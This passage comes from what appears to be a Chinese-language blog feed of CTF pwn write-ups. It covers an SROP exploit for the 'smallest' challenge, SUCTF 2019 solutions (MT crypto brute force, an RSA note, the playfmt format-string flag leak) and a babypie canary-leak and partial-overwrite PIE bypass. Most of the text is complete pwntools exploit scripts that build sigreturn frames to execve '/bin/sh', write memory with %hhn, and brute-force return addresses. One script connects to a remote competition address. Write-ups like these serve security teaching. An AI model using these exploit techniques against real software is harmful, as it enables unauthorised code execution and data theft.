class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = 0</span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = 0x400</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">payload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe)</span><br><span class="line">#把frame写入栈中</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">## set rax=15 and call sigreturn</span><br><span class="line">sigreturn = p64(syscall_ret) + &apos;b&apos; * 7</span><br><span class="line">sh.send(sigreturn)</span><br><span class="line"></span><br><span class="line">## call execv(&quot;/bin/sh&quot;,0,0)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + 0x150  # &quot;/bin/sh&quot; &apos;s addr</span><br><span class="line">sigframe.rsi = 0x0</span><br><span class="line">sigframe.rdx = 0x0</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + &apos;b&apos; * 8 + str(sigframe)  </span><br><span class="line">print len(frame_payload)</span><br><span class="line">payload = frame_payload + (0x150 - len(frame_payload)) * &apos;\x00&apos; + &apos;/bin/sh\x00&apos;</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(sigreturn)</span><br></pre></td></tr></table></figure><p>完整的exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">small = ELF(&apos;./smallest&apos;)</span><br><span class="line">if args[&apos;REMOTE&apos;]:</span><br><span class="line">    sh = remote(&apos;127.0.0.1&apos;, 7777)</span><br><span class="line">else:</span><br><span class="line">    sh = process(&apos;./smallest&apos;)</span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">syscall_ret = 0x00000000004000BE</span><br><span class="line">start_addr = 0x00000000004000B0</span><br><span class="line">## set start addr three times</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line">payload = p64(start_addr) * 3</span><br><span class="line">sh.send(payload)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">## modify the return addr to start_addr+3</span><br><span class="line">## so that skip the xor rax,rax; then the rax=1</span><br><span class="line">## get stack addr</span><br><span class="line">sh.send(&apos;\xb3&apos;)</span><br><span class="line">stack_addr = u64(sh.recv()[8:16])</span><br><span class="line">log.success(&apos;leak stack addr :&apos; + hex(stack_addr))</span><br><span class="line"></span><br><span class="line">## make the rsp point to stack_addr</span><br><span class="line">## the frame is read(0,stack_addr,0x400)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = 0</span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = 0x400</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">payload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">## set rax=15 and call sigreturn</span><br><span class="line">sigreturn = p64(syscall_ret) + &apos;b&apos; * 7</span><br><span class="line">sh.send(sigreturn)</span><br><span class="line"></span><br><span class="line">## call execv(&quot;/bin/sh&quot;,0,0)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + 0x150  # &quot;/bin/sh&quot; &apos;s addr</span><br><span class="line">sigframe.rsi = 0x0</span><br><span class="line">sigframe.rdx = 0x0</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + &apos;b&apos; * 8 + str(sigframe)</span><br><span class="line">print len(frame_payload)</span><br><span class="line">payload = frame_payload + (0x150 - len(frame_payload)) * &apos;\x00&apos; + &apos;/bin/sh\x00&apos;</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(sigreturn)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/09/02/srop/%E5%9B%BE%E7%89%873.png" alt><br>放一张23R3F大佬的理解过程图，写得很明了了<br>（不过关于p64(0)的地方为什么会变成syscall那长度为0xf的东西，我真的没理解到，感觉那个东西只是作为返回值，然后长度传给了rax，然后我一直以为p64（0）只是为了让frame如从上上图的结构，看来还得继续学习理解啊）</p><p>感觉srop就粗略的通过这题过了一下子，很多关于机制和寄存器的原理还是有点懵，底层知识还不扎实，要好好补补了</p><p>相关参考链接:<br><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/87447.html</a>  srop的原理<br><a href="https://www.jianshu.com/p/b838a10b63c7" target="_blank" rel="noopener">https://www.jianshu.com/p/b838a10b63c7</a>  23R3F师傅的wp</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Srop&quot;&gt;&lt;a href=&quot;#Srop&quot; class=&quot;headerlink&quot; title=&quot;Srop&quot;&gt;&lt;/a&gt;Srop&lt;/h2&gt;&lt;p&gt;Srop大概是一种，没有其他函数，找gadget会比较麻烦，无法利用来leak地址，借助signal handle机制’sigreturn’的系统调用，更改signal frame（这是一段代码）的一些寄存器的值做到系统调用，主要相关的寄存器有：rax（系统调用号）、rdi（存参）、rip（下一条指令）、rsp（栈顶），还有就是re_sigreturn（存sigreturn的系统调用号，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15）&lt;/p&gt;
&lt;p&gt;偷偷搬运一下wiki里的图，这就是一个signal frame，最后执行完sigreturn之后会执行execve（‘/bin/sh’,0,0）&lt;br&gt;&lt;img src=&quot;/2019/09/02/srop/%E5%9B%BE%E7%89%871.png&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>suctf的两三题wp</title>
    <link href="http://yoursite.com/2019/08/20/playfmt/"/>
    <id>http://yoursite.com/2019/08/20/playfmt/</id>
    <published>2019-08-20T14:58:39.000Z</published>
    <updated>2019-08-20T15:37:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>这次suctf我参与了的好像就三道题吧，还是和队友以及大佬商讨之后才弄出来的，发现自己真的太菜了</p><p>以下附上超级简单题的一些思路，当做给自己的记录吧</p><a id="more"></a><h2 id="MT-crpyto"><a href="#MT-crpyto" class="headerlink" title="MT - crpyto"></a>MT - crpyto</h2><p>这是个密码题，但是我re基础有点太弱了，纯靠逆估计得逆很久，那就选择爆破吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned int convert(unsigned int m) &#123;</span><br><span class="line">    m = m ^ m &gt;&gt; 13;</span><br><span class="line">    m = m ^ m &lt;&lt; 9 &amp; 2029229568ll;</span><br><span class="line">    m = m ^ m &lt;&lt; 17 &amp; 2245263360ll;</span><br><span class="line">    m = m ^ m &gt;&gt; 19;</span><br><span class="line">    return m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    unsigned int i;</span><br><span class="line">    for (i = 0; i &lt;= (unsigned int)0xffffffffll; i++) &#123;</span><br><span class="line">        if (i &amp; 0xfffff == 0)</span><br><span class="line">            printf(&quot;%u\n&quot;, i);</span><br><span class="line">        if (convert(i) == (unsigned int)1679057065ll) &#123;</span><br><span class="line">            printf(&quot;%u&quot;, i);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//1679057065       2226413449</span><br><span class="line">//3818208026       2938293886</span><br><span class="line">//2854351778       1730632668</span><br></pre></td></tr></table></figure><p>我们发现这道题就是把给的最终结果的flag切片，四个四个以字符的形式（两个十六进制数为一个）一循环，往函数里进行异或和位移操作</p><p>写python脚本的时候，崩溃了，跑不出来（能读的位太小？还是我python不熟啊？）换个c发现巨方便 </p><p>falg : 84B45F89AF22CE7E67275BDC<br>大写发现过不去，改成小写就可以了<br>flag{84b45f89af22ce7e67275bdc} </p><h2 id="signup-re"><a href="#signup-re" class="headerlink" title="signup - re"></a>signup - re</h2><p>天知道第一道逆向竟然是rsa（看见熟悉的65537就知道了）<br>把n丢到网站上分出两个质数<br>然后直接丢给解rsa的脚本跑一下就出flag了（脚本来自超级可爱的队友，这里就不po出来了）</p><p>flag是suctf{Pwn_@_hundred_years}</p><h2 id="Playfmt-pwn"><a href="#Playfmt-pwn" class="headerlink" title="Playfmt - pwn"></a>Playfmt - pwn</h2><p>这道题，格式化字符串<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%871.png" alt><br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%872.png" alt></p><p>看到这里觉得有些眼熟，这不是lab9的那个差不多吗，关键函数，漏洞位置都一样，然后我天真的以为可以套着lab9的方法做这道题，结果…我确实天真，写完脚本，疯狂get不到shell，发现地址没爆错啊，啥都没问题，那肯定是got表改不了的问题了，这个具体看程序函数，貌似是那个this指针？（this+1是指向flag的）</p><p>看程序就知道，flag是被读进了堆里，堆的地址，我不会分析，就直接爆破吧</p><p><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%873.png" alt></p><p>偏移为6的位置作为第一个ebp，指向下一个地址，而下一个又指向了再下一个地址。偏移分别为6 、14 、26，蓝色字体的地址为heap的地址，选择爆破的话，泄露那个应该都OK<br>我们知道flag是被写进堆里的，我们就把heap的地址存入ebp指向的地址处，同时会被存进26个偏移的位置（方便读取数据）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = process(&apos;./playfmt&apos;)</span><br><span class="line"># p = remote(&apos;120.78.192.35&apos;,9999)</span><br><span class="line">elf = ELF(&apos;./playfmt&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[&apos;printf&apos;]</span><br><span class="line">system_libc = libc.symbols[&apos;system&apos;]  </span><br><span class="line">printf_libc = libc.symbols[&apos;printf&apos;]  </span><br><span class="line"></span><br><span class="line">def read_addr(target_addr):</span><br><span class="line">    index1 = 6   #偏移是6的地方作为第一个ebp</span><br><span class="line">    index2 = 14   #偏移是14的地方作为ebp2     --&gt;   ebp里存的是ebp2的地址</span><br><span class="line">    value_ls = map(ord, p32(target_addr))</span><br><span class="line">    low_byte = stack_addr &amp; 0xff</span><br><span class="line">for i in range(4):   </span><br><span class="line">#stack地址就为ebp2处的地址，不变，heap的地址存在ebp2里，ebp2会指向ebp3，所以地址同时写入ebp3中</span><br><span class="line">#我对这个的理解是：第一处的payload代表每个ebp里的字节存入单字节heap的地址</span><br><span class="line">        payload = &apos;%&#123;&#125;c%&#123;&#125;$hhn\n\x00&apos;.format(low_byte + i, index1)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        p.recvline()</span><br><span class="line">        payload = &apos;%&#123;&#125;c%&#123;&#125;$hhn\n\x00&apos;.format(value_ls[i], index2)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        p.recvline()</span><br><span class="line"></span><br><span class="line">    success(&apos;target &apos; + hex(target_addr))</span><br><span class="line">    payload = &apos;%26$p\n\x00&apos;   #ebp2指向的地址处，只存放target_addr，可直接读取</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvline()</span><br><span class="line">    payload = &apos;%26$s\n\x00&apos;</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &apos;.%14$p.%18$p.\x00&apos;    #%19$p也可</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&quot;.&quot;)</span><br><span class="line">stack_addr = int(p.recv(10),16)</span><br><span class="line">success(&apos;stack &apos; + hex(stack_addr))</span><br><span class="line">p.recvuntil(&quot;.&quot;)</span><br><span class="line">heap_addr = int(p.recv(9),16)</span><br><span class="line"></span><br><span class="line">success(&apos;stack &apos; + hex(stack_addr))</span><br><span class="line">success(&apos;heap &apos; + hex(heap_addr))</span><br><span class="line">for i in range(-0x1000, 0, 0x4):      </span><br><span class="line">#这里就随意循环heap的地址，找到flag字符，然后打印出来即可</span><br><span class="line">        success(&apos;offset &apos; + hex(i))</span><br><span class="line">        read_addr(heap_addr + i)</span><br><span class="line">        ret = p.recvline()</span><br><span class="line">        if &apos;suctf&apos; in ret:</span><br><span class="line">            print(ret)</span><br><span class="line">            p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>然后找大佬问了一下怎么确定flag到底写在了哪里，发现是我自己c和数据结构没学好……果然逆向基础和代码基础还是很重要的（一句话，我太菜了）</p><p>V5是new出来的一个堆，这里的传参为this指针，v8是flag读入的堆，这里是a2（*this+1）</p><p><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%874.png" alt><br>Ida里找各个值的地址啥的<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%875.png" alt><br>New出来的v3为this，地址为[heap]0x08810E30<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%876.png" alt><br>其实看这个就能知道flag写在了末尾一个半字节为a10的地方，没关系，我们接着调。</p><p>我们输入%1$p发现它跳到了一个地方<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%877.png" alt></p><p>发现其实它还没输出东西，那我们就继续往下执行，到printf执行之后，打印出第一个偏移处的地址<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%878.png" alt></p><p>然后ida里，可以看见就在printf下面，那我们就算this的位置偏移是多少（数出来是19）<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%879.png" alt><br>我们修改一下ebp的地址，使他指向堆的地址（上面有说到第26个偏移的地方指向堆的地址，我们就把它改到ebp），然后我们把ebp2里指向的堆地址改成this+1的地址</p><p>我们tel一下查看堆里的信息，发现其实this+1里存的是flag的地址（上面的flag是自己本机的）<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%8710.png" alt><br>然后我们就可以通过%19$s输出真实地址<br>再把它写入ebp2，然后再执行%19$s就可以了<br>Po个exp（来自一位特别特别好的大佬）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = remote(&apos;120.78.192.35&apos;,9999)</span><br><span class="line">elf = ELF(&apos;./playfmt&apos;)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = &apos;%6$p&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(1)</span><br><span class="line">################## ebp&amp;ret</span><br><span class="line">log_ebp = int(p.recv(),16)#logo ebp 14$ 0xffffd048</span><br><span class="line">do_fmt_ebp = log_ebp - 0x20#do fmt ebp 6$ 0xffffd028</span><br><span class="line">do_fmt_return = log_ebp -0x1c#do_fmt return_to 7$</span><br><span class="line"></span><br><span class="line">log.info(&quot;log_ebp--&gt;p[%s]&quot;%hex(log_ebp))</span><br><span class="line">log.info(&quot;do_fmt_ebp1--&gt;p[%s]&quot;%hex(do_fmt_ebp))</span><br><span class="line">log.info(&quot;do_fmt_return--&gt;p[%s]&quot;%hex(do_fmt_return))</span><br><span class="line">#################3 this_addr,flag_addr_off</span><br><span class="line"></span><br><span class="line">payload = &apos;%19$p&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(1)</span><br><span class="line">heap_addr=int(p.recv(),16)#0x8050e30</span><br><span class="line">flag_addr_off=heap_addr+4 #0x8050e34</span><br><span class="line">log.info(&apos;heap_addr--&gt;p[%s]&apos;%hex(heap_addr))</span><br><span class="line">log.info(&apos;flag_addr_off--&gt;p[%s]&apos;%hex(flag_addr_off))</span><br><span class="line"></span><br><span class="line">################# change this to *flag on stack</span><br><span class="line">heap_addr_part=heap_addr &amp; 0xFF#0e30</span><br><span class="line">log_ebp_part=log_ebp &amp; 0xFF#d048</span><br><span class="line">heap_addr_stack_part=(log_ebp+0x14)&amp;0xFF#D05c</span><br><span class="line"></span><br><span class="line">log.info(&apos;heap_addr_part--&gt;p[%s]&apos;%hex(heap_addr_part))</span><br><span class="line">log.info(&apos;log_ebp_part--&gt;p[%s]&apos;%hex(log_ebp_part))</span><br><span class="line">log.info(&apos;heap_addr_stack_part--&gt;p[%s]&apos;%hex(heap_addr_stack_part))</span><br><span class="line"></span><br><span class="line">payload=&apos;%&apos;+str(heap_addr_stack_part)+&apos;d%6$hhn&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload=&apos;%&apos;+str(heap_addr_part+4)+&apos;d%14$hhn&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">################# leak flag_addr</span><br><span class="line">payload=&apos;%19$s\x00&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">flag_addr=u32(p.recv(4))</span><br><span class="line">#################</span><br><span class="line">payload=&apos;%&apos;+str(flag_addr&amp;0xFFFF)+&apos;d%14$hn&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;134515884&apos;)  #%1$p的地址 0x8048CAC</span><br><span class="line">p.sendline(&apos;%19$s\x00&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()`</span><br></pre></td></tr></table></figure><p>我们前面不是可以知道那个flag到底是读在了a10的地方吗？那我们就直接改一个，把一个指向栈地址的改成指向堆地址的地址，就是偏移为6的那个地方啦，然后直接修改堆的低地址（18偏移的地方地址为a28,离flag的地方特别近，直接改低一个字节的地址就可以了，贼方便了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"># p = remote(&apos;120.78.192.35&apos;,9999)</span><br><span class="line">p = process(&apos;./playfmt&apos;)</span><br><span class="line">elf = ELF(&apos;./playfmt&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;=\n&quot;)</span><br><span class="line">p.sendlineafter(&quot;=\n&quot;,&quot;%6$p&quot;)</span><br><span class="line">s = p.recvuntil(&quot;\n&quot;)</span><br><span class="line">stack_addr = int(s.strip(),16)</span><br><span class="line">print hex(stack_addr)</span><br><span class="line"></span><br><span class="line">stack = stack_addr + 0x10</span><br><span class="line">p.sendline(&quot;%&quot; + str(stack&amp;0xff) + &quot;c%6$hhn&quot;)</span><br><span class="line">p.sendline(&quot;%16c%14$hhn&quot;)</span><br><span class="line">p.sendline(&quot;%18$s&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%8711.png" alt></p><p>这道题真实的flag好像是suctf{P_rin_Tfo}</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次suctf我参与了的好像就三道题吧，还是和队友以及大佬商讨之后才弄出来的，发现自己真的太菜了&lt;/p&gt;
&lt;p&gt;以下附上超级简单题的一些思路，当做给自己的记录吧&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>partial overwrite</title>
    <link href="http://yoursite.com/2019/08/16/overwrite/"/>
    <id>http://yoursite.com/2019/08/16/overwrite/</id>
    <published>2019-08-16T07:00:49.000Z</published>
    <updated>2019-08-20T17:00:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="partial-overwrite"><a href="#partial-overwrite" class="headerlink" title="partial overwrite"></a>partial overwrite</h2><p>我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。<br>（对于绕过PIE的操作我是没怎么接触过的）<br>大概就是用字节覆盖修改地址，使程序跳转到我们想用的函数上去</p><a id="more"></a><h1 id="Babypie"><a href="#Babypie" class="headerlink" title="Babypie"></a>Babypie</h1><p><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%871.png" alt><br>这是一道保护全开的题<br><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%872.png" alt></p><p>看到主程序，发现有两处写入</p><p>Read函数的最大问题大概就是它不会给末尾加’\0’所以可以leak地址<br>leak canary<br>在第一次 read 之后紧接着就有一个输出, 而 read 并不会给输入的末尾加上 \0, 这就给了我们 leak 栈上内容的机会。<br>为了第二次溢出能控制返回地址, 我们选择 leak canary. 可以计算出第一次 read 需要的长度为 0x30 - 0x8 + 1 （因为canary的低位是\x00截断符，先用\x01去覆盖这个低位，然后打印出来后面的7位，最后加上\x00即可）、</p><p><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%873.png" alt></p><p>发现有个可以直接getshell的函数，直接可以调用<br>我们用第一个输入点把canary爆出来，然后第二个调用可以直接getshell的函数</p><p>然后exp的话，因为开了PIE所以只能知道低三位的地址，第四位得靠爆（真的是随缘的那种）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">try:</span><br><span class="line">p = process(&apos;./babypie&apos;)</span><br><span class="line"></span><br><span class="line">p.sendafter(&apos;:\n&apos;,&quot;a&quot;*(0x30-0x8+1))</span><br><span class="line">p.recvuntil(&quot;a&quot;*(0x30-0x8+1))</span><br><span class="line">canary = &apos;\0&apos; + p.recvn(7)</span><br><span class="line">print &quot;canary:&quot; + hex(u64(canary))</span><br><span class="line">p.sendafter(&quot;:\n&quot;, &apos;a&apos; * (0x30 - 0x8) + canary + &apos;bbbbbbbb&apos; + &apos;\x3E\x0A&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">except EOFError:</span><br><span class="line">p.close()</span><br><span class="line">continue</span><br></pre></td></tr></table></figure><p>爆破了n遍之后终于。。。<br><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%874.png" alt></p><p>然后发现，直接覆盖低两位地址就好了嘛！（read和system的函数贼接近，前面都是一样的，真的是要哭了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./babypie&apos;)</span><br><span class="line">p.sendafter(&apos;:\n&apos;,&quot;a&quot;*(0x30-0x8+1))</span><br><span class="line">p.recvuntil(&quot;a&quot;*(0x30-0x8+1))</span><br><span class="line">canary = &apos;\0&apos; + p.recvn(7)</span><br><span class="line">print &quot;canary:&quot; + hex(u64(canary))</span><br><span class="line">payload = &apos;&apos;</span><br><span class="line">payload += &apos;a&apos;* 0x28 + canary + &apos;aaaaaaaa&apos; + &apos;\x3E&apos;</span><br><span class="line">p.send(payload)</span><br><span 